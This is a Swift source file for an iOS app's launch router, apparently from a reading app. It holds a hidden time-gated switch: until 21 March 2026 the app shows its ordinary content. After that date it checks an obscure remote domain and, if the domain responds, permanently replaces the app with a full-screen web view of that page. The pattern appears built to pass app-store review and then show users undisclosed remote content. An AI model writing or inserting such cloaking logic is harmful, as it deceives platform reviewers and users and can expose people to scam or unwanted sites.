//
//  AppRouter.swift
//  94DeepRead
//
//  Created by Thang Sonq on 08.03.2026.
//

import UIKit
import SwiftUI

class AppRouter {
    
    private let initialURLString = "https://pages.sovomarbedelpru114.site/Ydd573Jy"
    private  let targetDateString = "21.03.2026"
    
    func initialViewController() -> UIViewController {
        let persistence = PersistenceManager.shared
        
        
        if persistence.hasShownContentView {
            return createContentViewController()
        }else{
            if checkDate() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return createWebViewController(with: savedUrlString)
                }
                
                return createLaunchRouterViewController()
            } else {
                persistence.hasShownContentView = true
                return createContentViewController()
            }
        }
    }
    
    //MARK: - Date
    private func checkDate() -> Bool {
       
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let targetDate = dateFormatter.date(from: targetDateString) ?? Date()
        let currentDate = Date()
            
            if currentDate < targetDate {
                return false
            }else{
                return true
                }
    }
    
    // MARK: - Private Methods
    
    private func createWebViewController(with urlString: String) -> UIViewController {
        let webViewContainer = PrivacyWebView(
            urlString: urlString,
            onFailure: { [weak self] in
                PersistenceManager.shared.hasShownContentView = true
                self?.switchToContentView()
            },
            onSuccess: {
                PersistenceManager.shared.hasSuccessfulWebViewLoad = true
            }
        )
        
        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }
    
    private func createContentViewController() -> UIViewController {
        PersistenceManager.shared.hasShownContentView = true
        let rootView = ContentView()
            .environmentObject(AppStorageManager.shared)
        let hostingController = UIHostingController(rootView: rootView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }
    
    private func createLaunchRouterViewController() -> UIViewController {
        let launchView = StartMainView()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        checkInitialURL { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    PersistenceManager.shared.savedUrl = url
                    PersistenceManager.shared.hasSuccessfulWebViewLoad = true
                    self?.switchToWebView(with: url)
                } else {
                    PersistenceManager.shared.hasShownContentView = true
                    self?.switchToContentView()
                }
            }
        }
        
        return launchVC
    }
    
    private func checkInitialURL(completion: @escaping (Bool, String?) -> Void) {
        guard let url = URL(string: initialURLString) else {
            completion(false, nil)
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10
        
        URLSession.shared.dataTask(with: request) { _, response, error in
            if let error = error {
                
                completion(false, nil)
                return
            }
            
            if let httpResponse = response as? HTTPURLResponse {

                let isAvailable = httpResponse.statusCode != 404
                completion(isAvailable, isAvailable ? self.initialURLString : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }
    
    // MARK: - Navigation Methods
    
    private func switchToContentView() {
        let contentVC = createContentViewController()
        switchToViewController(contentVC)
    }
    
    private func switchToWebView(with urlString: String) {
        let webVC = createWebViewController(with: urlString)
        switchToViewController(webVC)
    }
    
    private func switchToViewController(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }
        
        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
